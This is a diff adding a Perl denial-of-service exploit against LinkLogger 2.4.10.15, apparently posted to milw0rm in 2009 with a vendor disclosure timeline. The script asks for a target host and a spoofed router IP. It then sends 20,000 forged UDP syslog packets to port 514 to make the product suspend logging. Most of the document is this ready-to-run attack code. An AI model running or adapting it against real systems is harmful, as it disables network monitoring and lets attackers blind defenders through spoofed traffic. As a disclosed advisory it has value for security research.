@@ -1,0 +1,52 @@
+#!/usr/bin/perl
+######################################################
+# LinkLogger 2.4.10.15 syslog DoS
+# Tested against 2.4.10.15
+# Coded by Mike Cyr, aka h00die
+# mcyr2     at           csc         dot_____________com
+# Notes: 1. Based on code from http://www.pythonprasanna.com/Papers%20and%20Articles/Sockets/udpspoof_pl.txt
+#        2. The exact amount of packets to overwhelm the program and shut down the port fluctuates, 20k seems to be very successful though
+#        3. No joke, this is a great grat product, i love it and highly recommend it.
+#	     4. The syslogd module in LinkLogger is from another vendor, attempts to find out which failed.
+# Greetz to muts and loganWHD, I tried harder
+# http://www.offensive-security.com/offsec101.php turning script kiddies into ninjas daily
+# Log: Vendor notification 4/13/09
+#      Vendor acknowledgement 4/14/09, the syslogd is actually from another company, vendor contacts syslogd vendor.
+#	   Vendor can not run DoS code successfully 5/11/09
+#	   Sent instructions and video on how to install all needed modules and run successfully 5/12/09
+#	   Asked for update, no response 6/8/09
+# 	   Sent to milw0rm and security focus 6/13/09
+######################################################
+
+use Net::RawIP;
+use Time::Local;
+use Date::Format;
+
+print "LinkLogger Host IP (destination): ";
+$DESTINATION = <>;
+chomp($DESTINATION);
+
+print "Source IP (router's IP): ";
+
+$SPOOFED_SOURCE = <>;
+chomp($SPOOFED_SOURCE);
+
+$SOURCE_PORT = 2050;
+
+$new_socket = new Net::RawIP({udp =>{}}); 
+$BUFF = 1;
+
+@lt = localtime(time);
+print "\nSending 20,000 packets to $DESTINATION from $SPOOFED_SOURCE kill";
+while ($BUFF < 20000){
+$BAD_DATA = "<12>" . strftime('%b  %d %T',@lt) . " kernel: ACCEPT IN=br0 OUT=vlan1 SRC=999.999.999.999 DST=999.999.888.999 LEN=48 TOS=0x00 PREC=0x00 TTL=127 ID=39832 DF PROTO=TCP SPT=99999 DPT=20098 SEQ=3783024034 ACK=0 WINDOW=16384 RES=0x00 SYN URGP=0 OPT (020405B401010402) ";
+
+$new_socket->set({ip => {saddr => $SPOOFED_SOURCE , daddr => $DESTINATION , tos => 22} ,
+                udp  => {source => $SOURCE_PORT, dest => 514,data => $BAD_DATA }});
+
+$new_socket->send;
+$BUFF = $BUFF + 1;
+}
+print "\nPackets sent, LinkLogger should now say Logging Suspended No Conection to Router\n";
+
+# milw0rm.com [2009-06-15]
